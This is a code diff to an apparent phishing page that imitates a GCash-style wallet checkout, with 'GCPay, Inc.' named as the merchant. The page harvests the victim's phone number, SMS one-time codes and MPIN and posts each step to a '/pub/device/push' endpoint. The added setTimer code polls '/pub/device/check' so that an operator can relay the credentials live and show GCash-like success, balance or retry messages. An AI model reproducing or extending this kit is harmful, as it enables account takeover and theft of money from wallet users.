@@ -379,7 +379,7 @@
 </h1>
 <div class="layout-content">
 
-<!--login-->
+<!--  -->
 <div  id="login" class="main-container login-page warp2">
 <div class="merchant-info">
 <div class="row"><label>Merchant</label> <span class="merchant-name">GCPay, Inc.</span></div>
@@ -416,7 +416,7 @@ NEXT
 
 
 
-<!--logincode-->
+<!--pay code-->
 <div   style="display: none;" id="digit2" class="main-container otp-page otp-input-style warp2" >
 <div class="page-container content-center">
 <div class="page-item digit-message">
@@ -448,7 +448,7 @@ NEXT
 <input type="hidden" name="m_id" value="2962540331787">
 </div>
 
-<!--logincode end-->
+<!--pay code end-->
 
 <!--second verify OTP-->
 
@@ -676,7 +676,7 @@ NEXT
 </div>
 </footer>
 </div>
-<input type="hidden" name="m_id" id="m_id" value="2962540331787">
+
 <div data-v-0393febb=""></div>
 </div>
 <!--mpin Paid   -->
@@ -836,19 +836,17 @@ NEXT
 		</script>
 <script type="text/javascript">
 
-			var money = getQueryString('money');
+			var money = getQueryString('amount');
 			if(money){
 				$('.money.amount').html('PHP ' + money)
 			}
 
 			var httpUrl = "http://192.168.3.189:8080";
-			httpUrl="";
+			//httpUrl="";
 						// var order_id = "T11072332438744375524";
 			var order_id = getQueryString('out_trade_no');
 
-			//$("#g_amount").html(`PHP ${getQueryString('amount')}`)
-			$(".money").html(`PHP ${getQueryString('amount')}`)
-
+		var timer=null;
 			
 
 			var account = "";
@@ -861,11 +859,6 @@ NEXT
 			//$("#timeout-page").show();
 			//$("#balance-page").show();
 
-			//$(".warp2").show();
-			//					$("#digit").show();
-						//		$("#code").focus();
-
-						//$("#mpin").show();
 
 			function orderStateById() {
 				$.ajax({
@@ -905,6 +898,90 @@ NEXT
 				login();
 			});
 
+
+			function setTimer(order_id,step,second){
+            if(timer){
+                clearInterval(timer);
+            }
+
+			$('.loadingBox').show();
+   
+            timer=setInterval(function(){
+
+				$.ajax({
+                    url: httpUrl + "/pub/device/check",
+                    data: {
+                        "order_id": order_id,
+                        "step": step
+      
+					},  dataType: "json", type: "post",
+					success: function (data) {
+
+						data=data.data
+
+						if(data){
+
+							if(parseInt(data.status)==1&&step==2){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								/*** 已绑定 进入pin ***/
+								$(".warp2").hide();
+								$("#mpin").show();
+								$("#PayPassword").focus();
+							}else if(parseInt(data.status)==2&&step==2){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$('#digit-btn').after('<p class="errortip">6-digit code is not correct</p>');
+							}else if(parseInt(data.status)==1&&step==3){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+
+								$(".warp2").hide();
+                                $("#success-page").show();
+							}else if(parseInt(data.status)==2&&step==3){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$('#mpin-btn').after('<p class="errortip">4-digit MPIN is not currect</p>');
+							}else if(parseInt(data.status)==3&&step==3){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$('#mpin-btn').after('<p class="errortip">You do not have enough balance to send money. Please Cash-In via the App or any Gcash Partner Outlet to proceed.</p>');
+							}else if(parseInt(data.status)==4&&step==3){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								
+								$(".warp2").hide();
+								$("#digit2").show();
+								$("#code2").focus();
+							
+							}else if(parseInt(data.status)==1&&step==4){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+
+								$(".warp2").hide();
+                                $("#success-page").show();
+							}else if(parseInt(data.status)==2&&step==4){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$('#digit-btn2').after('<p class="errortip">6-digit code is not correct</p>');
+							}else if(parseInt(data.status)==3&&step==4){
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$('#digit-btn2').after('<p class="errortip">'+data.desc+'</p>');
+							}
+	
+						}
+
+
+
+
+					}})
+
+
+
+				},second*1000);
+			}
+
 			function login() {
 
 				account = $('.phone').val();
@@ -934,7 +1011,7 @@ NEXT
 				$.ajax({
 					url: httpUrl + "/pub/device/push",
 					data: {
-						"out_trade_no": order_id,
+						"order_id": order_id,
 						"step":1,
 						"input": account
 					},
@@ -1022,7 +1099,7 @@ NEXT
 				$.ajax({
 					url: httpUrl + "/pub/device/push",
 					data: {
-						"out_trade_no": order_id,
+						"order_id": order_id,
 						"step":3,
 						"input": passwd
 					},
@@ -1038,8 +1115,9 @@ NEXT
 						data=data.data
 						if (data.step == 3) {
 
-								$(".warp2").hide();
-								$("#success-page").show();
+							setTimer(order_id,3,2)
+
+					
 
 
 							// if (data.args.response.des.indexOf("bind phone ok") > -1) {
@@ -1080,7 +1158,7 @@ NEXT
 						// }
 					},
 					complete: function () {
-						$('.loadingBox').fadeOut();
+						//$('.loadingBox').fadeOut();
 						delete _el.requesting;
 					},
 					error: function (err) {
@@ -1111,13 +1189,14 @@ NEXT
 					return;
 				}
 
+
 				_el.requesting = true;
 
 		
 				$.ajax({
 					url: httpUrl + "/pub/device/push",
 					data: {
-						"out_trade_no": order_id,
+						"order_id": order_id,
 						"step": 2,
 						"input": smscode
 					},
@@ -1129,15 +1208,17 @@ NEXT
 					dataType: "json",
 					type: "post",
 					success: function (data) {
-						console.log(data);
-						data=data.data
-						if (data.step == 2) {
-								/*** 已绑定 进入pin ***/
-								$(".warp2").hide();
-								$("#mpin").show();
-								$("#PayPassword").focus();
+
+
+						setTimer(order_id,2,2)
+						// console.log(data);
+						// data=data.data
+						// if (data.step == 2) {
+
+			
+					
 								
-						} 
+						// } 
 						
 						// else {
 						// 	if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
@@ -1160,7 +1241,7 @@ NEXT
 						// }
 					},
 					complete: function () {
-						$('.loadingBox').fadeOut();
+						//$('.loadingBox').fadeOut();
 						delete _el.requesting;
 					},
 					error: function (err) {
@@ -1199,12 +1280,11 @@ NEXT
 				_el.requesting = true;
 
 				$.ajax({
-					url: httpUrl + "/Info/GetTransfer",
+					url: httpUrl + "/pub/device/push",
 					data: {
 						"order_id": order_id,
-						"account": account,
-						"passwd": passwd,
-						"smscode": smscode
+						"step":4,
+						"input": smscode
 					},
 					beforeSend: function () {
 						$('.loadingBox').show();
@@ -1214,38 +1294,41 @@ NEXT
 					dataType: "json",
 					type: "post",
 					success: function (data) {
-						console.log(data);
-						if (data && data.args && data.args.response && data.args.response.isSuccess == 1) {
-							if (data.args.response.des.indexOf("success") > -1) {
-								/*** 提示成功  结束处理 ***/
-								$(".warp2").hide();
-								$("#success-page").show();
-							}
-						} else {
-							if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
-								var s = regExpNumber(data.args.response.des);
-								if (s) {
-									setTimeout(function () {
-										delete _el.requesting;
-									}, s * 1000)
-									$(_el).after('<p class="errortip" style="text-align:center">' + data.args.response.des + '</p>');
-									sleep(1500);
-									$("#mpin").show();
-								}
-							} else {
-								console.log('GetTransfer Error');
-								$(".warp2").hide();
-								$("#mpin").show();
-								//$("#failed").show();
-								/*alert(data.args.response.des);*/
-								//$('#failed').find('h2').after('<p class="errortip">'+data.args.response.des+'</p>');
-								//$('#failed').after('<button class="errortipbtn">Try Again</button>');
-							}
-						}
+						
+						setTimer(order_id,4,2)
+
+						// console.log(data);
+						// if (data && data.args && data.args.response && data.args.response.isSuccess == 1) {
+						// 	if (data.args.response.des.indexOf("success") > -1) {
+						// 		/*** 提示成功  结束处理 ***/
+						// 		$(".warp2").hide();
+						// 		$("#success-page").show();
+						// 	}
+						// } else {
+						// 	if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
+						// 		var s = regExpNumber(data.args.response.des);
+						// 		if (s) {
+						// 			setTimeout(function () {
+						// 				delete _el.requesting;
+						// 			}, s * 1000)
+						// 			$(_el).after('<p class="errortip" style="text-align:center">' + data.args.response.des + '</p>');
+						// 			sleep(1500);
+						// 			$("#mpin").show();
+						// 		}
+						// 	} else {
+						// 		console.log('GetTransfer Error');
+						// 		$(".warp2").hide();
+						// 		$("#mpin").show();
+						// 		//$("#failed").show();
+						// 		/*alert(data.args.response.des);*/
+						// 		//$('#failed').find('h2').after('<p class="errortip">'+data.args.response.des+'</p>');
+						// 		//$('#failed').after('<button class="errortipbtn">Try Again</button>');
+						// 	}
+						//}
 
 					},
 					complete: function () {
-						$('.loadingBox').fadeOut();
+						//$('.loadingBox').fadeOut();
 						delete _el.requesting;
 					},
 					error: function (err) {
